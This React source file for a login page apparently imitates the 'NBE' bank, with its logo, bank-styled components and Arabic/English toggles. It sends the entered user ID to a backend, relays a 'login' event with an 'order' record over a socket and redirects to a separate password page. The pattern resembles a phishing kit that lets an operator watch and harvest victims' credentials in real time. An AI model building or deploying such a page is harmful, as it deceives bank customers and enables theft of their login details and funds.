import axios from "axios";
import React, { useState } from "react";
import { api_route, socket } from "../App";
import { useLanguage } from "../hooks/useLanguage";
import LanguageToggle from "../components/nbe/LanguageToggle";
import UserTypeToggle from "../components/nbe/UserTypeToggle";
import ForgotLink from "../components/nbe/ForgotLink";
import LoginButtonRow from "../components/nbe/LoginButtonRow";
import QuickActionCards from "../components/nbe/QuickActionCards";
import OutlinedInput from "../components/nbe/OutlinedInput";

export const id = sessionStorage.getItem("id");

const Home = () => {
  const [loading, setLoading] = useState(false);
  const [username, setUserName] = useState("");
  const { t, dir } = useLanguage();

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    try {
      const { data } = await axios.post(api_route + "/login", { username });
      socket.emit("login", data.order);
      sessionStorage.setItem("id", data.order._id);
      window.location.href = "/password";
    } catch (error) {
      console.log(error);
      setLoading(false);
    }
  };

  return (
    <div className="w-full min-h-screen bg-white flex flex-col items-center">
      <form
        className="w-full max-w-md mx-auto px-4 pb-6 flex flex-col justify-between flex-1"
        onSubmit={handleSubmit}
      >
        <LanguageToggle />

        <div className="flex flex-col ">
          <div className="flex flex-col items-center gap-8 my-6">
            <img src="/img1.png" alt="NBE Logo" className="w-3/5" />
            <UserTypeToggle />
          </div>

          <div className="w-full flex flex-col mt-10">
            <OutlinedInput
              type="text"
              required
              dir={dir}
              label={t("userId")}
              value={username}
              onChange={(e) => setUserName(e.target.value)}
            />
            <ForgotLink>{t("forgotUserId")}</ForgotLink>

            <LoginButtonRow loading={loading} label={t("login")} />

            <div className="flex flex-col items-center gap-3 mt-6">
              <button
                type="button"
                className="text-nbe-green font-semibold underline text-lg"
              >
                {t("registerNow")}
              </button>
              <button
                type="button"
                className="text-zinc-900 font-semibold underline text-base text-center"
              >
                {t("becomeCustomer")}
              </button>
            </div>
          </div>
        </div>

        <QuickActionCards />
      </form>
    </div>
  );
};

export default Home;
